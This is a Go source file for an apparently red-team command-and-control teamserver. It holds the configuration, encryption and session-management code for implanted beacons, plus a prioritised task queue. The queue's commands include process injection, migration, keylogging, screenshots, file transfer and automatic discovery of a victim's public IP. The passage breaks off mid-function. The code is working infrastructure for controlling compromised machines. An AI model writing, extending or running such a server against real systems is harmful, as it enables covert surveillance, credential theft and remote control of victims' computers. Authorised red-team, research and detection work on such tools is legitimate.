package main

import (
        "crypto/aes"
        "crypto/cipher"
        "crypto/rand"
        "crypto/sha256"
        "encoding/base64"
        "encoding/hex"
        "encoding/json"
        "fmt"
        "io"
        "log"
        "net"
        "net/http"
        "os"
        "strings"
        "sync"
        "time"

        "github.com/google/uuid"
)

// ======================== CONFIG ========================

type Config struct {
        APIHost       string `json:"api_host"`
        APIPort       int    `json:"api_port"`
        Host          string `json:"host"`
        Port          int    `json:"port"`
        EncryptionKey string `json:"encryption_key"`
        Password      string `json:"password"`
        UseTLS        bool   `json:"use_tls"`
        TLSCert       string `json:"tls_cert"`
        TLSKey        string `json:"tls_key"`
        JWTSecret     string `json:"jwt_secret"`
}

var serverConfig Config

func LoadConfig() Config {
        // ── JWT Secret ─────────────────────────────────────────────────────
        // Auto-generate cryptographically random 32-byte secret if not set.
        // Every server restart = new JWT secret = all operator sessions
        // invalidated (forces re-login). Intentional OPSEC behaviour.
        // To persist across restarts: set C2_JWT_SECRET env var.
        jwtSecret := getEnv("C2_JWT_SECRET", "")
        if jwtSecret == "" {
                b := make([]byte, 32)
                if _, err := rand.Read(b); err != nil {
                        log.Fatalf("[CONFIG] FATAL: cannot generate JWT secret: %v", err)
                }
                jwtSecret = hex.EncodeToString(b)
                log.Println("[CONFIG] JWT secret auto-generated (set C2_JWT_SECRET to persist across restarts)")
        }
        if len(jwtSecret) < 32 {
                log.Fatalf("[CONFIG] FATAL: C2_JWT_SECRET too short (min 32 chars) — refusing weak secret")
        }
        // ── S-M3 FIX: reject low-entropy JWT secrets ─────────────────────────
        // The OLD check above was len() >= 32, which accepted ANY 32-char
        // string — even "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" (32 a's). That
        // secret has ~1.4 bits of entropy; brute-forceable in microseconds.
        // The auto-generated value above is already 64 hex chars (32 bytes
        // of full entropy), so the additional check below accepts the
        // generated value and ALSO accepts a 32+ char string with at least
        // 16 distinct chars in the first 32 (a heuristic for "looks random
        // enough" — passphrases with mixed vocab easily clear this bar).
        // It rejects trivial secrets like 32 a's or "0123456789" repeated.
        if !isStrongJWTSecret(jwtSecret) {
                log.Fatalf("[CONFIG] FATAL: C2_JWT_SECRET too weak — must be 64 hex chars (32 bytes of entropy) OR 32+ chars with at least 16 distinct characters in the first 32")
        }

        // ── Encryption Key ─────────────────────────────────────────────────
        // Must be exactly 64 hex chars (32 bytes). Auto-generate + warn if missing.
        encKey := getEnv("C2_ENC_KEY", "")
        if encKey == "" {
                b := make([]byte, 32)
                rand.Read(b)
                encKey = hex.EncodeToString(b)
                // OPSEC FIX (audit S-CR2): Don't log the full auto-generated key.
                // If SIEM/journald captures this log line, the vault master key
                // is exposed → vault.db fully decryptable. Log only a SHA256
                // fingerprint (first 16 hex chars) for correlation — enough to
                // verify the key is the same across restarts, not enough to
                // reconstruct it. Production should ALWAYS set C2_ENC_KEY
                // explicitly — the auto-generate path is a dev convenience.
                keyFingerprint := sha256.Sum256([]byte(encKey))
                log.Printf("[CONFIG] WARNING: C2_ENC_KEY not set — auto-generated (fingerprint: %x...)",
                        keyFingerprint[:8])
                log.Println("[CONFIG] Set C2_ENC_KEY env var to use a fixed key across restarts")
        }
        if len(encKey) != 64 {
                log.Fatalf("[CONFIG] FATAL: C2_ENC_KEY must be exactly 64 hex chars (32 bytes), got %d chars", len(encKey))
        }

        // ── Operator Password ───────────────────────────────────────────────
        // Reject default/weak values at startup — fail fast.
        password := getEnv("C2_PASSWORD", "")
        weakPasswords := map[string]bool{
                "":         true,
                "changeme": true,
                "password": true,
                "admin":    true,
                "hero":     true,
                "123456":   true,
        }
        if weakPasswords[password] {
                log.Fatalf("[CONFIG] FATAL: C2_PASSWORD is not set or is a known weak value. Set a strong password in env.")
        }

        cfg := Config{
                APIHost:       getEnv("C2_API_HOST", "127.0.0.1"),
                APIPort:       getEnvInt("C2_API_PORT", 5000),
                Host:          getEnv("C2_HOST", "0.0.0.0"),
                Port:          getEnvInt("C2_PORT", 8443),
                EncryptionKey: encKey,
                Password:      password,
                UseTLS:        getEnvBool("C2_USE_TLS", false),
                TLSCert:       getEnv("C2_TLS_CERT", "server.crt"),
                TLSKey:        getEnv("C2_TLS_KEY", "server.key"),
                JWTSecret:     jwtSecret,
        }
        serverConfig = cfg
        return cfg
}

func getEnv(key, def string) string {
        if v := os.Getenv(key); v != "" {
                return v
        }
        return def
}

func getEnvInt(key string, def int) int {
        if v := os.Getenv(key); v != "" {
                var i int
                if _, err := fmt.Sscanf(v, "%d", &i); err == nil {
                        return i
                }
        }
        return def
}

func getEnvBool(key string, def bool) bool {
        if v := os.Getenv(key); v != "" {
                return strings.ToLower(v) == "true"
        }
        return def
}

// isStrongJWTSecret — S-M3 entropy gate for C2_JWT_SECRET.
//
// Accepts a secret as "strong enough" if EITHER:
//
//   (a) it is exactly 64 hex chars (= 32 bytes of full entropy) — this is
//       what the auto-generated value above is, and matches the C2_ENC_KEY
//       requirement. Hex.DecodeString returning nil err guarantees every
//       byte carries ~8 bits of entropy and the key space is 2^256.
//
//   (b) it is at least 32 chars long AND the first 32 chars contain at
//       least 16 DISTINCT byte values — a cheap, conservative heuristic
//       that rejects the obvious weak secrets:
//         • "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" → 1 distinct char
//         • "0123456789" × 4                    → 10 distinct chars
//         • "abcdefgh" × 4                      →  8 distinct chars
//       while accepting realistic passphrases like a 4-word diceware
//       passphrase (24-32 chars, typically 20+ distinct chars).
//
// This is NOT a substitute for using the auto-generated 64-hex value in
// production. It's a backstop so a deployer who writes `C2_JWT_SECRET=hunter2`
// in their .env gets a hard fail at startup instead of an HMAC key with
// 7 bits of entropy.
func isStrongJWTSecret(s string) bool {
        if len(s) < 32 {
                return false
        }
        // (a) 64 hex chars → 32 bytes of full entropy
        if len(s) == 64 {
                if _, err := hex.DecodeString(s); err == nil {
                        return true
                }
        }
        // (b) ≥16 distinct byte values in the first 32 chars
        first32 := s[:32]
        seen := make(map[byte]bool, 32)
        for i := 0; i < len(first32); i++ {
                seen[first32[i]] = true
        }
        return len(seen) >= 16
}

// ======================== CRYPTO ========================

var aesGCM cipher.AEAD

// InitCrypto — initializes the server-side AES-256-GCM cipher used for
// /api/login password comparison and the operator activity log encryption.
//
// BUGFIX (Bug #9 — Key Handling): the old code did
//   kb := []byte(key)
// which converts the 64-char HEX STRING to its 64 raw ASCII bytes — NOT
// the 32 raw bytes that AES-256 needs. Then the `len(kb) != 32` check
// failed, so it zero-padded the 64 ASCII bytes down to 32 — silently
// producing a weak key derived from the first 32 chars of the hex string
// (basically a 16-byte key with 16 bytes of entropy).
//
// FIX: hex-decode the key first. LoadConfig() already validates that
// C2_ENC_KEY is exactly 64 hex chars, so this should always succeed —
// but we fail loudly if it doesn't, because a silent weak key is worse
// than a server that won't start.
func InitCrypto(hexKey string) {
        // Hex decode — 64 chars → 32 bytes. LoadConfig() validates the format,
        // but defensive: a malformed key here is a fatal configuration error.
        kb, err := hex.DecodeString(hexKey)
        if err != nil {
                log.Fatalf("[CRYPTO] FATAL: C2_ENC_KEY is not valid hex (expected 64 hex chars): %v", err)
        }
        if len(kb) != 32 {
                log.Fatalf("[CRYPTO] FATAL: C2_ENC_KEY decoded to %d bytes, expected 32 (64 hex chars). "+
                        "This should never happen — LoadConfig() validates this. Refusing to start with a weak key.", len(kb))
        }
        block, err := aes.NewCipher(kb)
        if err != nil {
                log.Fatalf("[CRYPTO] AES init failed: %v", err)
        }
        aesGCM, err = cipher.NewGCM(block)
        if err != nil {
                log.Fatalf("[CRYPTO] GCM init failed: %v", err)
        }
        // Zero the key bytes immediately — they're now embedded in the cipher
        // and we don't need the raw bytes on the stack anymore.
        for i := range kb {
                kb[i] = 0
        }
        log.Println("[CRYPTO] AES-256-GCM initialized (hex-decoded key, 32 bytes)")
}

func Encrypt(plaintext []byte) (string, error) {
        nonce := make([]byte, aesGCM.NonceSize())
        if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
                return "", err
        }
        return base64.StdEncoding.EncodeToString(aesGCM.Seal(nonce, nonce, plaintext, nil)), nil
}

func Decrypt(encoded string) ([]byte, error) {
        ct, err := base64.StdEncoding.DecodeString(encoded)
        if err != nil {
                return nil, err
        }
        ns := aesGCM.NonceSize()
        if len(ct) < ns {
                return nil, fmt.Errorf("ciphertext too short")
        }
        nonce, ct := ct[:ns], ct[ns:]
        return aesGCM.Open(nil, nonce, ct, nil)
}

// ======================== SESSIONS ========================

type Session struct {
        ID            string         `json:"id"`
        Hostname      string         `json:"hostname"`
        OS            string         `json:"os"`
        Username      string         `json:"username"`
        Arch          string         `json:"arch"`
        IP            string         `json:"ip"`
        PID           int            `json:"pid"`
        FirstSeen     time.Time      `json:"first_seen"`
        LastSeen      time.Time      `json:"last_seen"`
        Active        bool           `json:"active"`
        Stale         bool           `json:"stale"`           // UI: true = SLEEPING (overdue, expected back)
        ListenerID    string         `json:"listener_id"`
        SleepTime     int            `json:"sleep_time"`
        Jitter        float64        `json:"jitter"`
        Tasks         []Task         `json:"tasks"`
        CheckinNum    int            `json:"checkin_num"`

        // ── Bug #3 fix: precomputed stale deadline ──────────────────────────
        // Computed once at checkin time (set in FindOrCreateSession / re-checkin)
        // from (LastSeen, SleepTime, Jitter) so the polling hot path
        // (/api/sessions every 3-5s × N sessions) is just a single time.After
        // comparison. Was: per-poll float multiply + duration add per session,
        // 50 sessions × 1 query/s = 50 wasted float ops/sec; trivial CPU but
        // unnecessary, and the precompute is exact-same-semantics, zero cost.
        staleDeadline time.Time `json:"-"`
        // v9 dashboard chain columns — agent-reported ground truth + server truth:
        //   InternalIP = agent's own NIC IP (source of the egress chain)
        //   PublicIP   = agent's NAT/public IP, discovered via operator-triggered
        //                `trueip` task ("—" until then)
        //   IP         (above) stays the SERVER-seen peer = redirector hop when
        //                a pivot is in path (destination of the chain)
        //   Process/Parent = hosting process images ("explorer.exe" after inject)
        //   Privs     = system|admin|user as reported at checkin
        //   Transport = listener protocol the beacon rides (https/tcp/...)
        InternalIP    string         `json:"internal_ip"`
        PublicIP      string         `json:"public_ip"`
        Process       string         `json:"process"`
        Parent        string         `json:"parent_process"`
        Privs         string         `json:"privs"`
        Transport     string         `json:"transport"`
        KillDate      string         `json:"kill_date"`  // profile-baked kill date (YYYY-MM-DD), server-enforced
        Crypto        *SessionCrypto `json:"-"` // HKDF session keys — not serialised

        // v9.1 auto-trueip throttle (not serialised): last time we auto-queued
        // a `trueip` discovery task for this session. Retries back off to 1/10min
        // until the beacon returns a valid public IP; stops once PublicIP is set.
        trueipQueuedAt time.Time
}

// SnapshotSession returns a copy that is SAFE to marshal outside the session
// lock. BUGFIX: the old paths shallow-copied (or marshalled the live pointer),
// so json.Marshal raced with CompleteTask/AddTask/heartbeat writers mutating
// Tasks/LastSeen/CheckinNum — torn reads and intermittent corrupt JSON.
// Tasks is deep-copied under whichever lock the caller holds; Crypto is
// json:"-" so it needs no handling.
func SnapshotSession(s *Session) Session {
        cp := *s
        cp.Tasks = append([]Task(nil), s.Tasks...)
        return cp
}

// TaskPriority constants — higher number = executed first
// urgent (3): kill, sleep, inject — time-critical operator commands
// high   (2): upload, download, screenshot — operator-interactive
// normal (1): default for all operator tasks
// low    (0): auto-queued internal tasks (trueip, agraph, admap)
const (
        PriorityLow    = 0
        PriorityNormal = 1
        PriorityHigh   = 2
        PriorityUrgent = 3
)

// urgentCmds — commands that are always queued at PriorityUrgent.
// Even if 20 normal tasks are pending, these execute first.
var urgentCmds = map[string]bool{
        "kill": true, "sleep": true, "jitter": true,
        "inject": true, "migrate": true, "exit": true,
}

// highCmds — commands queued at PriorityHigh.
var highCmds = map[string]bool{
        "screenshot": true, "upload": true, "download": true,
        "keylog": true, "keylog_stop": true,
}

// inferPriority — derive task priority from command name.
// Operator-specified priority overrides this (future: API field).
func inferPriority(command string) int {
        if urgentCmds[command] { return PriorityUrgent }
        if highCmds[command]   { return PriorityHigh }
        return PriorityNormal
}

type Task struct {
        ID        string    `json:"id"`
        SessionID string    `json:"session_id"`
        Command   string    `json:"command"`
        Args      string    `json:"args"`
        Status    string    `json:"status"`
        Result    string    `json:"result"`
        Priority  int       `json:"priority"`  // 0=low 1=normal 2=high 3=urgent
        Created   time.Time `json:"created"`
        Completed time.Time `json:"completed"`
}

type SessionManager struct {
        sessions map[string]*Session
        mu       sync.RWMutex
}

var sessionMgr *SessionManager

func InitSessions() {
        sessionMgr = &SessionManager{sessions: make(map[string]*Session)}
        log.Println("[SESSION] Session manager initialized")
}

func (sm *SessionManager) AddSession(s *Session) {
        sm.mu.Lock()
        defer sm.mu.Unlock()
        s.ID = uuid.New().String()
        s.FirstSeen = time.Now().UTC()
        s.LastSeen = time.Now().UTC()
        s.Active = true
        s.Tasks = make([]Task, 0)
        s.CheckinNum = 1
        sm.sessions[s.ID] = s
        log.Printf("[SESSION] New: %s (%s@%s / %s)", s.ID[:8], s.Username, s.Hostname, s.OS)
        BroadcastEvent("session_new", SnapshotSession(s)) // never hand the live pointer to WS marshals
        LogActivity("session", fmt.Sprintf("New: %s@%s (%s) from %s", s.Username, s.Hostname, s.OS, s.IP))
        writeSessionHeader(s) // history file: agent_db/history_<id>.log (text, operator-readable)
}

func (sm *SessionManager) GetSession(id string) (*Session, bool) {
        sm.mu.RLock()
        defer sm.mu.RUnlock()
        s, ok := sm.sessions[id]
        return s, ok
}

// FindByIDPrefix — v3 GET-poll support: locate a session by the first 8
// chars of its UUID (the agent's `?v=` cache-buster param doubles as the
// O(1)-intent routing token). O(n) scan is fine at red-team scale; UUIDv4
// gives 32 bits of entropy in 8 chars, collisions are a non-issue here.
// Same live-pointer contract as resolveSessionByCrypto — callers must not
// retain the pointer across mutations.
func (sm *SessionManager) FindByIDPrefix(prefix string) *Session {
        sm.mu.RLock()
        defer sm.mu.RUnlock()
        for id, s := range sm.sessions {
                if strings.HasPrefix(id, prefix) {
                        return s
                }
        }
        return nil
}

func (sm *SessionManager) GetAllSessions() []Session {
        sm.mu.RLock()
        defer sm.mu.RUnlock()
        now := time.Now().UTC()
        result := make([]Session, 0, len(sm.sessions))
        for _, s := range sm.sessions {
                cp := SnapshotSession(s) // deep-copy Tasks under the lock — marshal later is race-free
                // ════════════════════════════════════════════════════════
                // PASSIVE STATUS DERIVATION — server never kills sessions
                // ════════════════════════════════════════════════════════
                // Status is computed from the PRECOMPUTED deadline (Bug #3 fix).
                // The polling hot path is now just a single time.After comparison
                // per session — no float math, no duration add. The deadline is
                // refreshed in FindOrCreateSession on every checkin so it tracks
                // any `sleep N` / `jitter X` operator overrides.
                //
                // ALIVE:   now.Before(deadline) → agent checking in
                // SLEEPING: now.After(deadline) but Active=true → overdue, expected back
                // DEAD:    Active=false → operator manually killed
                // ════════════════════════════════════════════════════════
                // Defensive: if staleDeadline is zero (session created before
                // this fix was deployed, or in a test), fall back to the legacy
                // inline computation. We do NOT mutate s here — we're under
                // RLock and writing to s.staleDeadline would race with
                // FindOrCreateSession's computeStaleDeadline(s) call. The
                // next checkin refreshes the field properly.
                deadline := s.staleDeadline
                if deadline.IsZero() {
                        sleep := s.SleepTime
                        if sleep <= 0 {
                                sleep = 60
                        }
                        jitter := s.Jitter
                        if jitter < 0 {
                                jitter = 0.2
                        }
                        if jitter > 1 {
                                jitter = 1
                        }
                        maxOneCycle := float64(sleep) * (1.0 + jitter)
                        deadline = s.LastSeen.Add(time.Duration(maxOneCycle+60) * time.Second)
                }
                // OPSEC FIX (user-reported): Don't mark as SLEEPING if the
                // agent is actively executing a task. When a task is
                // dispatched (Status="sent"), the agent is awake and
                // working — even if the heartbeat is overdue. Show ALIVE.
                hasActiveTask := false
                for _, t := range s.Tasks {
                        if t.Status == "sent" || t.Status == "pending" {
                                hasActiveTask = true
                                break
                        }
                }
                cp.Stale = now.After(deadline) && s.Active && !hasActiveTask
                result = append(result, cp)
        }
        return result
}

func (sm *SessionManager) UpdateSession(id string) bool {
        sm.mu.Lock()
        defer sm.mu.Unlock()
        s, ok := sm.sessions[id]
        if !ok {
                return false
        }
        s.LastSeen = time.Now().UTC()
        s.CheckinNum++
        // OPSEC FIX (user-reported): recompute staleDeadline on EVERY update
        // (heartbeat + result). Without this, the deadline stays based on the
        // checkin-time LastSeen — after one sleep cycle, the deadline is in the
        // past, and the polling check shows SLEEPING even though the agent
        // just heartbeated. Now the deadline is pushed forward on every
        // heartbeat/result → session shows ALIVE correctly.
        computeStaleDeadline(s)
        // Broadcast session_update so the operator dashboard refreshes
        // LastSeen + CheckinNum + Stale status immediately.
        BroadcastEvent("session_update", SnapshotSession(s))
        return true
}

func (sm *SessionManager) RemoveSession(id string) {
        sm.mu.Lock()
        defer sm.mu.Unlock()
        if s, ok := sm.sessions[id]; ok {
                s.Active = false
                log.Printf("[SESSION] Killed: %s", id[:8])
                BroadcastEvent("session_lost", SnapshotSession(s)) // snapshot — not the live pointer
                LogActivity("session", fmt.Sprintf("Killed: %s (%s@%s)", id[:8], s.Username, s.Hostname))
                markSessionKilled(id) // history file: append "KILLED" line (file kept for operator review)
                delete(sm.sessions, id)
        }
}

// FindOrCreateSession atomically finds an existing session by hostname+username
// or creates a new one under a single lock. Prevents duplicate sessions on
// concurrent re-checkins (was race condition: unlock + re-lock gap).
// v9: extended with agent-reported recon (internalIP/process/parent/privs) and
// the listener protocol. Recon fields REFRESH on every checkin so the dashboard
// reflects reality after migration (new hosting process) or elevation
// (user → admin → system).
//
// BUGFIX (Bug #1 — Identity Collision): the old match key was
//   (Hostname, Username) —Administrator@host-a and Administrator@host-b on
// two different machines would map to ONE session, so tasks queued for
// machine A could land on machine B. Common usernames (Administrator,
// admin, vagrant) make this a real-world bug, not a theoretical one.
//
// FIX: include InternalIP in the identity key. Two machines on the same
// network have different NIC IPs (DHCP guarantees this), and agents
// report their own InternalIP at every checkin (comms.rs gather_sysinfo).
// Hostname + Username + InternalIP is unique enough; we also match on
// ListenerID so a re-checkin from a different transport (e.g. after a
// profile swap that flipped to a new listener) creates a fresh session
// rather than silently mutating the old one.
//
// Edge cases handled:
//   - InternalIP == "" (very old agent that didn't report it): fall back
//     to the legacy (Hostname, Username) match — better one collision risk
//     than two sessions per machine forever.
//   - Same InternalIP appearing twice (NAT hairpin, two VMs behind one
//     host): the listener ID still disambiguates when listeners differ.
//     If both come through the same listener, hostname disambiguates.
func (sm *SessionManager) FindOrCreateSession(
        hostname, username, os, arch, ip string,
        pid int, sleepTime int, jitter float64,
        crypto *SessionCrypto, listenerID string,
        internalIP, process, parent, privs, transport string,
) (sessionID string, isNew bool) {
        sm.mu.Lock()
        defer sm.mu.Unlock()
        // Search existing active session
        for id, s := range sm.sessions {
                if s.Hostname != hostname || s.Username != username || !s.Active {
                        continue
                }
                // ── Bug #1 fix: identity key extension ───────────────────────────
                // InternalIP is the agent's own NIC IP — stable across reboots,
                // different across machines on the same network (DHCP). When the
                // agent didn't report it (legacy field empty), fall back to the
                // legacy behaviour so we don't fragment sessions on upgrade.
                if internalIP != "" && s.InternalIP != "" && s.InternalIP != internalIP {
                        continue // same user@host label, different NIC = different machine
                }
                // ListenerID disambiguates the same machine reaching the
                // server through two different listeners (pivot + direct,
                // or after a profile swap that moved to a new listener).
                if listenerID != "" && s.ListenerID != "" && s.ListenerID != listenerID {
                        continue
                }
                // ──────────────────────────────────────────────────────────────
                s.LastSeen = time.Now().UTC()
                s.CheckinNum++
                s.Crypto = crypto
                // v9: refresh dashboard recon fields (process can change
                // after migration; privs after elevation)
                if internalIP != "" { s.InternalIP = internalIP }
                if process != "" { s.Process = process }
                s.Parent = parent
                if privs != "" { s.Privs = privs }
                if transport != "" { s.Transport = transport }
                // Bug #3 fix: recompute the stale deadline every checkin —
                // SleepTime/Jitter could have changed if the agent got a
                // `sleep N` command between cycles, which would invalidate
                // the previously-computed deadline.
                computeStaleDeadline(s)
                // OPSEC FIX (user-reported): broadcast session_update on
                // re-checkin too. New sessions get session_new (below), but
                // re-checkins were silent — the dashboard didn't refresh
                // until the next /api/sessions poll. Now both paths push
                // an immediate WebSocket update.
                BroadcastEvent("session_update", SnapshotSession(s))
                log.Printf("[C2] Re-checkin: %s (%s@%s ip=%s checkin #%d)", id[:8], username, hostname, s.InternalIP, s.CheckinNum)
                writeSessionHeader(s) // history file: refresh header with new LastSeen + CheckinNum
                return id, false
        }
        // No existing session — create new (still under lock)
        sess := &Session{
                Hostname:   hostname,
                OS:         os,
                Username:   username,
                Arch:       arch,
                IP:         ip,
                PID:        pid,
                SleepTime:  sleepTime,
                Jitter:     jitter,
                Tasks:      make([]Task, 0),
                Crypto:     crypto,
                ListenerID: listenerID,
                InternalIP: internalIP,
                Process:    process,
                Parent:     parent,
                Privs:      privs,
                Transport:  transport,
        }
        sess.ID = uuid.New().String()
        sess.FirstSeen = time.Now().UTC()
        sess.LastSeen = time.Now().UTC()
        sess.Active = true
        sess.CheckinNum = 1
        computeStaleDeadline(sess)  // Bug #3 fix: precompute for the polling hot path
        sm.sessions[sess.ID] = sess
        log.Printf("[SESSION] New: %s (%s@%s / %s)", sess.ID[:8], username, hostname, os)
        BroadcastEvent("session_new", SnapshotSession(sess)) // snapshot — not the live pointer
        LogActivity("session", fmt.Sprintf("New: %s@%s (%s) from %s", username, hostname, os, ip))
        writeSessionHeader(sess)  // new session → write fresh history file
        return sess.ID, true
}

// SetPublicIP (v9) — store the agent's discovered public/NAT IP (from a
// `trueip` task result) and push a session_update event so the GUI's
// True IP column refreshes without waiting for the next poll cycle.
// Caller (graph.go OnTaskResult) has already validated the IP format.
func (sm *SessionManager) SetPublicIP(sessionID, ip string) {
        sm.mu.Lock()
        s, ok := sm.sessions[sessionID]
        if !ok {
                sm.mu.Unlock()
                return
        }
        s.PublicIP = ip
        s.trueipQueuedAt = time.Now()   // v9.1: success — stop auto-retries
        snap := SnapshotSession(s)
        sm.mu.Unlock()
        BroadcastEvent("session_update", snap)
        log.Printf("[SESSION] True IP stored: %s -> %s", sessionID[:8], ip)
        writeSessionHeader(s) // history file: refresh header so Public IP shows
}

// QueueTrueipOnce (v9.1) — automatic True IP discovery. The operator asked
// for the beacon to resolve its own public IP without a manual right-click,
// so the teamserver queues the (already whitelisted) `trueip` inline task by
// itself when the True IP column is still unknown. Safety rails:
//   - no-op once PublicIP is known (never re-tasks after success)
//   - max ONE outstanding trueip task per session (pending/sent check)
//   - throttled to one attempt per 10 minutes (failed lookups retry slowly;
//     no-airgap machines resolve on the very first try)
// The request still originates from the teamserver tasking channel — the
// beacon only ever answers tasks it is sent.
//
// BUGFIX (Bug #4 — Race + Blind Spot): the original code did
//   sm.mu.Unlock()
//   if _, err := sm.AddTask(...); err == nil { log }
// Two bugs:
//   (a) RACE: between Unlock() and AddTask()'s internal Lock(), another
//       goroutine can call RemoveSession(sessionID) — AddTask then fails
//       with "session not found", but the trueipQueuedAt is already set
//       to now+10min so the next auto-retry is delayed 10 minutes for a
//       session that doesn't even exist anymore. (Harmless — the session
//       is gone — but the same window applies to a transient AddTask
//       failure on a LIVE session.)
//   (b) BLIND SPOT: if AddTask fails on a live session (e.g. transient
//       lock contention or a future validation gate), trueipQueuedAt
//       stays set for 10 min. Agent gets NO trueip task → operator
//       dashboard stuck on "—" for the True IP column for 10 minutes.
//
// FIX: on AddTask failure, reset trueipQueuedAt to zero so the next
// checkin immediately re-queues. On AddTask success, the field stays at
// `now` as before (one task per 10min).
func (sm *SessionManager) QueueTrueipOnce(sessionID string) {
        sm.mu.Lock()
        s, ok := sm.sessions[sessionID]
        if !ok || s.PublicIP != "" {
                sm.mu.Unlock()
                return
        }
        now := time.Now()
        if !s.trueipQueuedAt.IsZero() && now.Sub(s.trueipQueuedAt) < 10*time.Minute {
                sm.mu.Unlock()
                return
        }
        for _, t := range s.Tasks {
                if t.Command == "trueip" && (t.Status == "pending" || t.Status == "sent") {
                        s.trueipQueuedAt = now   // one already in flight — just back off
                        sm.mu.Unlock()
                        return
                }
        }
        s.trueipQueuedAt = now
        sm.mu.Unlock()
        if _, err := sm.AddTaskWithPriority(sessionID, "trueip", "", PriorityLow); err == nil {
                log.Printf("[SESSION] auto-trueip: discovery task queued for %s", sessionID[:8])
        } else {
                // Bug #4 fix: AddTask failed (transient lock contention, or
                // session removed in the race window). Reset trueipQueuedAt
                // so the next checkin retries immediately instead of waiting
                // 10 minutes for a task that was never queued.
                sm.mu.Lock()
                if s2, ok := sm.sessions[sessionID]; ok {
                        s2.trueipQueuedAt = time.Time{} // zero value → retry next checkin
                        log.Printf("[SESSION] auto-trueip: AddTask failed (%v) — reset throttle for immediate retry on %s",
                                err, sessionID[:8])
                }
                sm.mu.Unlock()
        }
}

// maxCompletedTasks — Bug #2 fix.
//
// Without a cap, every task ever queued stays in s.Tasks forever — the
// slice grows monotonically and gets serialized on every /api/sessions
// response. 1000 commands × 5KB avg result = 5MB per session in the JSON
// response. Long ops (dormant agent for weeks) leak gigabytes.
//
// Cap: keep at most 200 completed tasks per session, oldest-first trim.
// Pending/sent tasks are NEVER trimmed — that would drop unacknowledged
// operator commands silently.
//
// 200 is enough for the operator's "what did I just run?" scrollback
// while keeping the JSON payload bounded.
const maxCompletedTasks = 200

// computeStaleDeadline — Bug #3 fix.
//
// Precompute the deadline past which a session is considered SLEEPING
// (overdue but Active). Pure function of (lastSeen, sleepTime, jitter).
// Stored in s.staleDeadline at checkin time so the polling hot path is
// just a single time comparison per session.
//
// Threshold = max_one_cycle_sleep + 60s generous buffer
//   max_one_cycle = sleep * (1 + jitter)
//   With sleep=10, jitter=0.6: threshold = 16 + 60 = 76s
//   With sleep=60, jitter=0.2: threshold = 72 + 60 = 132s
//
// Caller MUST hold sm.mu (mutates s).
func computeStaleDeadline(s *Session) {
        sleep := s.SleepTime
        if sleep <= 0 {
                sleep = 60
        }
        jitter := s.Jitter
        if jitter < 0 {
                jitter = 0.2
        }
        if jitter > 1 {
                jitter = 1
        }
        maxOneCycle := float64(sleep) * (1.0 + jitter)
        s.staleDeadline = s.LastSeen.Add(time.Duration(maxOneCycle+60) * time.Second)
}

// trimCompletedTasks drops the oldest completed tasks until len(completed)
// is <= maxCompletedTasks. Pending and sent tasks are always preserved.
// Caller MUST hold sm.mu (this function mutates s.Tasks in place).
func (sm *SessionManager) trimCompletedTasks(s *Session) {
        if s == nil || len(s.Tasks) <= maxCompletedTasks {
                return
        }
        // Count completed (don't touch pending/sent).
        var completedIdxs []int
        for i, t := range s.Tasks {
                if t.Status == "completed" {
                        completedIdxs = append(completedIdxs, i)
                }
        }
        if len(completedIdxs) <= maxCompletedTasks {
                return // nothing to drop
        }
        dropCount := len(completedIdxs) - maxCompletedTasks
        // Drop the OLDEST `dropCount` completed tasks. completedIdxs is sorted
        // ascending (we walked s.Tasks in order), so the first `dropCount` are
        // the oldest. We rebuild the slice without them in a single pass.
        dropSet := make(map[int]struct{}, dropCount)
        for i := 0; i < dropCount; i++ {
                dropSet[completedIdxs[i]] = struct{}{}
        }
        kept := make([]Task, 0, len(s.Tasks)-dropCount)
        for i, t := range s.Tasks {
                if _, drop := dropSet[i]; drop {
                        continue
                }
                kept = append(kept, t)
        }
        s.Tasks = kept
        log.Printf("[TASK] Trimmed %d oldest completed tasks from session %s",
                dropCount, s.ID[:8])
}

func (sm *SessionManager) AddTask(sessionID, command, args string) (string, error) {
        sm.mu.Lock()
        defer sm.mu.Unlock()
        s, ok := sm.sessions[sessionID]
        if !ok {
                return "", fmt.Errorf("session not found")
        }
        // Kill date server-side enforcement:
        // If the session's profile has a kill_date and it has passed,
        // refuse new tasks — protects against accidentally tasking a
        // beacon that should have exited (profile baked kill_date may
        // not have been acted on if the agent was offline).
        if s.KillDate != "" {
                if kd, err := time.Parse("2006-01-02", s.KillDate); err == nil {
                        if time.Now().UTC().After(kd.Add(24 * time.Hour)) {
                                log.Printf("[TASK] REFUSED: session %s past kill_date %s", sessionID[:8], s.KillDate)
                                return "", fmt.Errorf("session past kill_date %s — task refused", s.KillDate)
                        }
                }
        }
        task := Task{
                ID:        uuid.New().String(),
                SessionID: sessionID,
                Command:   command,
                Args:      args,
                Status:    "pending",
                Priority:  inferPriority(command),
                Created:   time.Now().UTC(),
        }
        s.Tasks = append(s.Tasks, task)
        // Bug #2 fix: trim after every AddTask so the cap is enforced on the
        // write path. Cheap (one linear pass) and bounded by maxCompletedTasks.
        sm.trimCompletedTasks(s)
        log.Printf("[TASK] Queued: %s -> %s cmd=%s pri=%d", task.ID[:8], sessionID[:8], command, task.Priority)
        appendTaskQueued(s, &task) // history file: append task entry (queued state)
        return task.ID, nil
}

// AddTaskWithPriority — same as AddTask but with explicit priority override.
// Used internally for auto-queued tasks (trueip, agraph, admap) that should
// never block operator commands.
func (sm *SessionManager) AddTaskWithPriority(sessionID, command, args string, priority int) (string, error) {
        sm.mu.Lock()
        defer sm.mu.Unlock()
        s, ok := sm.sessions[sessionID]
        if !ok {
                return "", fmt.Errorf("session not found")
        }
        // Kill date server-side enforcement:
        // If the session's profile has a kill_date and it has passed,
        // refuse new tasks — protects against accidentally tasking a
        // beacon that should have exited (profile baked kill_date may
        // not have been acted on if the agent was offline).
        if s.KillDate != "" {
                if kd, err := time.Parse("2006-01-02", s.KillDate); err == nil {
                        if time.Now().UTC().After(kd.Add(24 * time.Hour)) {
                                log.Printf("[TASK] REFUSED: session %s past kill_date %s", sessionID[:8], s.KillDate)
                                return "", fmt.Errorf("session past kill_date %s — task refused", s.KillDate)
                        }
                }
        }
        task := Task{
                ID:        uuid.New().String(),
                SessionID: sessionID,
                Command:   command,
                Args:      args,
                Status:    "pending",
                Priority:  priority,
                Created:   time.Now().UTC(),
        }
        s.Tasks = append(s.Tasks, task)
        sm.trimCompletedTasks(s)
